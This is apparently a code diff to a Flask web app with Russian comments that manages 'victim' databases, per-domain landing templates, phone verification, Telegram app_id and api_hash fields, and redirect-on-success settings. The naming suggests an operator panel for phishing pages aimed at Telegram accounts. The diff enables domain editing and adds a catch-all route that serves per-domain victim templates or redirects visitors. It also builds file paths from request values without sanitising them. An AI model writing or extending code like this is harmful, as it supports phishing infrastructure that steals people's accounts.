@@ -396,11 +396,7 @@ def edit_domain():
             if not db_victim.CheckDomain(domain):
                 return jsonify({'status': 'error', 'message': 'Такого домена не существует!'})
             else:
-                print(countries)
-                countries_db = ', '.join(countries)
-                print(countries_db)
-
-                # db_victim.EditDomain(domain, page, path, security, redirect, countries, redirect_success, username, app_id, api_hash)
+                db_victim.EditDomain(domain, page, path, security, redirect, countries, redirect_success, username, app_id, api_hash)
                 return jsonify({'status': 'success', 'message': 'Домен успешно изменён'})
             
     else:
@@ -515,15 +511,6 @@ def verify_phone():
 
 
 
-###########################################
-#                                         #
-#               Тестирование              #
-#                                         #
-###########################################
-@app.route('/tg', methods=['POST', 'GET'])
-def tg():
-    return render_template('domains/jojo.html')
-
 
 
 
@@ -538,11 +525,32 @@ def tg():
 ###########################################
 @app.errorhandler(404)
 def page_not_found(e):
-    return redirect(url_for('index', path=request.path.replace('/', '')))
+    return redirect(url_for('path', path=request.path.replace('/', '')))
 
 
-
-
+###########################################
+#                                         #
+#       Получить все данные домена        #
+#                                         #
+###########################################
+@app.route('/<path>', methods=['POST'])
+def path(path):
+    host = request.headers.get('Host')
+    try:
+        path = request.args.get('path', None)
+        url = host + '$' + path
+        username = os.listdir(f'templates/domains/{url}/')[0]
+        return render_template(f'domains/{url}/{username}')
+    except Exception as e:
+        print(e)
+        domains = os.listdir(f'templates/domains/')
+        for domain in domains:
+            if host in domain:
+                username = os.listdir(f'templates/domains/{domain}/')
+                username = username[0].replace(".html", "")
+                db_victim = Victim(f'./users/{username}/database.db')
+                url_redirect = db_victim.GetRedirect()
+                return redirect(url_redirect[0][0])
 
 ###########################################
 #                                         #
